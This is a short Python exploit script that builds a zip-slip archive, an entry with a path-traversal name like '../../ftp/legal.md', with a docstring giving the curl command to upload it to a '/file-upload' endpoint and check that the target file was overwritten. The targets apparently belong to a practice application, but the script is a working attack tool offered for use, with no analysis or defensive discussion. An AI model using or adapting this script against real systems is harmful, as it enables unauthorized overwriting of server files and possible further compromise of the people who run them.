#!/usr/bin/env python3
"""Build a zip-slip archive for the /file-upload ZIP extraction flaw.

Usage:
  make_zip_slip.py OUT.zip ../../ftp/legal.md "replacement content"

Then upload:
  curl -X POST "$BASE_URL/file-upload" -F "file=@OUT.zip"
and confirm the target file was overwritten.
"""

import argparse
from zipfile import ZIP_DEFLATED, ZipFile


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("out", help="output archive path, e.g. slip.zip")
    ap.add_argument("entry", help="traversal entry name, e.g. ../../ftp/legal.md")
    ap.add_argument("content", default="overwritten by zip-slip", nargs="?")
    args = ap.parse_args()
    with ZipFile(args.out, "w", ZIP_DEFLATED) as z:
        z.writestr(args.entry, args.content)
    print(f"[*] wrote {args.out} with entry {args.entry!r}")


if __name__ == "__main__":
    main()
